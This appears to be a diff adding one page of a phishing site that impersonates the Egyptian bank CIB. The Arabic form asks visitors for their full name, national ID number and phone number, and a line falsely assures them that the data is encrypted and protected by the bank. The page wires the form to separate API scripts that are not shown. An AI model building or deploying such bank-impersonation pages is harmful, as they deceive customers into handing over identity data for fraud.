@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - المعلومات الشخصية</title>
+    <link rel="stylesheet" href="personal.css" />
+  </head>
+  <body>
+    <header class="top-header">
+      <div class="logo-wrap">
+        <img class="logo" src="img/logo.png" alt="CIB" />
+      </div>
+      <div class="sep" aria-hidden="true"></div>
+    </header>
+
+    <main class="page">
+      <section class="card">
+        <h1 class="title">المعلومات الشخصية</h1>
+
+        <form class="form" action="#" method="post" autocomplete="off">
+          <div class="field">
+            <label for="full-name">الاسم الكامل</label>
+            <input id="full-name" type="text" placeholder="الاسم الكامل" />
+          </div>
+
+          <div class="field">
+            <label for="national-id">الرقم القومي</label>
+            <input id="national-id" type="text" placeholder="رقم الهوية" />
+          </div>
+
+          <div class="field">
+            <label for="phone">رقم الهاتف</label>
+            <input id="phone" type="text" placeholder="رقم الهاتف" />
+          </div>
+
+          <button type="submit" class="btn">متابعة</button>
+        </form>
+
+        <p class="note">جميع البيانات مشفَّرة ومحمية وفق معايير البنك التجاري الدولي</p>
+
+        <img
+          class="banner"
+          src="C:\Users\User\.cursor\projects\c-Users-User-OneDrive-Desktop-CIB\assets\c__Users_User_AppData_Roaming_Cursor_User_workspaceStorage_ae9887ea45c4982377abefa769de5cf3_images_image-e6ea08e7-9dd5-4838-b90a-3832a0ba907d.png"
+          alt="عرض CIB"
+        />
+      </section>
+    </main>    
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        initializeFormHandler('.form', 'personal');
+      });
+    </script>  </body>
+</html>
+
